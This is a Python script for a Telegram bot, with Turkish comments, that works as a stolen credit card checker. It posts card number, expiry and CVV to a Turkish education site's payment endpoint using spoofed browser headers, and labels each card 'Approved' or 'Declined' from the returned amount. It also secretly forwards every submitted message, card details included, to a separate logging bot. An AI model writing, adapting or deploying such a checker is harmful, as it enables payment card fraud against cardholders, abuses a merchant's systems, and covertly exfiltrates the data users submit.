#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import os
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import time

# ENV VARIABLES
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_BOT_TOKEN = os.getenv("LOG_BOT_TOKEN")
LOG_CHAT_ID = int(os.getenv("LOG_CHAT_ID"))

# API URL
CARD_CHECK_URL = 'https://www.tongucakademi.com/uyelikpaketleri/getcardpoint'

# Global değişkenler
live_count = 0
dead_count = 0

def format_amount(raw_amount):
    length = len(raw_amount)
    if length <= 2:
        return '0,' + raw_amount.zfill(2)
    else:
        return raw_amount[:-2] + ',' + raw_amount[-2:]

def check_card(lista_param):
    cc_details = lista_param.split('|')
    if len(cc_details) != 4:
        return ("error", "❌ Geçersiz kart formatı.\nDoğru format: 4444555566667777|12|28|123", "0")
    
    c, m, y, cv = cc_details
    if len(y) == 4:
        y = y[-2:]
    
    post_data = {
        'KartNo': c,
        'KartAd': 'emir+cevk',
        'KartCvc': cv,
        'KartAy': m,
        'KartYil': y,
        'Total': '12599.1'
    }
    
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.tongucakademi.com',
        'referer': 'https://www.tongucakademi.com/uyelikpaketleri/odeme/276',
        'user-agent': 'Mozilla/5.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    try:
        response = requests.post(
            CARD_CHECK_URL,
            data=post_data,
            headers=headers,
            timeout=10
        )
        response_data = response.json()
        raw_amount = '0'
        
        if 'Data' in response_data and response_data['Data']:
            if 'Amount' in response_data['Data']:
                amount_value = response_data['Data']['Amount']
                if isinstance(amount_value, (int, float)):
                    raw_amount = str(int(amount_value))
        
        formatted_amount = format_amount(raw_amount)

        if int(raw_amount) > 0:
            result = f"✅ Approved|{lista_param}|{formatted_amount} TL"
            return ("live", result, raw_amount)
        else:
            result = f"❌ Declined|{lista_param}|0,00 TL"
            return ("dead", result, raw_amount)

    except Exception as e:
        return ("error", f"❌ Hata: {str(e)}", "0")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot aktif ✅")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_message = update.message.text.strip()

    # LOG
    try:
        requests.post(
            f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage",
            data={"chat_id": LOG_CHAT_ID, "text": user_message}
        )
    except:
        pass

    status, result, _ = check_card(user_message)
    await update.message.reply_text(result)


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("Bot çalışıyor...")
    app.run_polling()


# ====== FLASK EKLENDİ (RENDER İÇİN) ======

from flask import Flask
import threading

web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Bot çalışıyor!"

def run_bot():
    main()

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()
    web_app.run(host='0.0.0.0', port=10000)